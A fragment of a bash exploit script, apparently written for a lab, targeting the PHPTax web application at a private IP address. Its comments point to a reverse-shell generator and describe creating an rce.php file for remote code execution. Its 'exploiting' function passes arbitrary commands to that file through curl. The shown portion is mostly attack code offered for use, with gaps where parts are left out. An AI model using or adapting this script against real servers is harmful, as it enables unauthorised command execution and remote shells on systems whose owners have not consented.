...
#the reverse shell can be generate from revshells.com or from any reverse shell generator
...
# the url for the running application (phptax) 
url="http://172.16.62.134:8080/phptax/"

# the url going to be used to creat a file to enable rce(rce.php) 
...
function exploiting {
        curl -A "Mozilla/4.0" http://172.16.62.134:8080/phptax/data/rce.php?cmd=$1 #change this url to the where the application ip is for you case
